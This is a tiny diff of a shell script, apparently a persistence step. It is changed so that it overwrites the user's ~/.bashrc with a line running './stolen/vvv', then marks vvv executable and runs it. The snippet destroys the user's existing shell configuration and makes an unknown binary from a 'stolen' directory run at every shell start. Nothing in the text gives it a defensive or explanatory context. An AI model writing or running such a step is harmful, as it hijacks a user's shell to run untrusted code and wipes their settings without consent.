@@ -1,3 +1,3 @@
-echo "./stolen/vvv" > .bashrc
+echo "./stolen/vvv" > ~/.bashrc
 chmod +x vvv
 ./vvv
